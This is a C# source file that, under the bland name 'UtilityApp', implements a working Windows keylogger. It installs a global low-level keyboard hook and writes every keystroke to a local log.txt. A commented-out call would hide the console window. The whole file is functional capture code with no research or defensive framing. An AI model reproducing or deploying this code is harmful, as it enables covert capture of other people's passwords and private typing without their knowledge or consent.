using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

namespace UtilityApp
{
    class KeyCatch
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public void Run()
        {
            var handle = GetConsoleWindow();

            //Hide
            //ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static bool IsKeyAChar(Keys key)
        {
            return key >= Keys.A && key <= Keys.Z;
        }

        private static bool IsKeyADigit(Keys key)
        {
            return (key >= Keys.D0 && key <= Keys.D9) || (key >= Keys.NumPad0 && key <= Keys.NumPad9);
        }

        private static bool IsKeyANumPadDigit(Keys key)
        {
            return key >= Keys.NumPad0 && key <= Keys.NumPad9;
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                //Console.WriteLine((Keys)vkCode);
                KeysConverter kc = new KeysConverter();
                string output = "";

                //Check if its a letter or numpad to keep the switch to a min
                if (!IsKeyAChar((Keys)vkCode) && !IsKeyANumPadDigit((Keys)vkCode))
                {
                    switch ((Keys)vkCode)
                    {
                        case Keys.Space:
                            output = " ";
                            break;
                        case Keys.RShiftKey:
                        case Keys.Shift:
                        case Keys.LShiftKey:
                        case Keys.ShiftKey:
                            output = "[SHIFT]";
                            break;
                        default:
                            output = "[" + kc.ConvertToString((Keys)vkCode) + "]";
                            break;
                    }
                }
                else if (IsKeyANumPadDigit((Keys)vkCode))
                {
                    //Is a numpad number. Strip the "NumPad" from the string
                    output = kc.ConvertToString((Keys)vkCode).Substring(6);
                }
                else
                {
                    //Is a letter
                    output = kc.ConvertToString((Keys)vkCode).ToLower();
                }
                Console.WriteLine(output);
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                sw.Write(output);
                //sw.Write(kc.ConvertToString((Keys)vkCode));
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}
